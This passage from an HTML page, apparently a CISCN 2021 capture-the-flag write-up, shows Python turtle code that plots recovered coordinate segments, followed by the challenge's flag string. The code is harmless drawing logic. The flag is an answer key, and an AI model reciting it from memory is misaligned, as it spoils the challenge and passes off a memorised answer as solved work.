turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span>width <span class="token operator">=</span> <span class="token number">800</span><span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">600</span><span class="token punctuation">)</span>

nextup <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> xy<span class="token punctuation">,</span> z <span class="token keyword">in</span> segments<span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> xy<span class="token punctuation">,</span> z<span class="token punctuation">)</span>
	<span class="token keyword">if</span> nextup<span class="token punctuation">:</span>
		nextup <span class="token operator">=</span> <span class="token boolean">False</span>
		turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment">#turtle.goto(*xy)</span>
	turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span>xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> z <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
		nextup <span class="token operator">=</span> <span class="token boolean">True</span>

turtle<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p><img src="2021-ciscn/3-1-1.png" alt=""></p> <p><code>CISCN{d4f1fb80bc11ffd722861367747c0f10}</code></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1eac7796.js" defer></script><script src="/assets/js/2.da4aa226.js" defer></script><script src="/assets/js/33.8ec69a13.js" defer></script>
  </body>
</html>
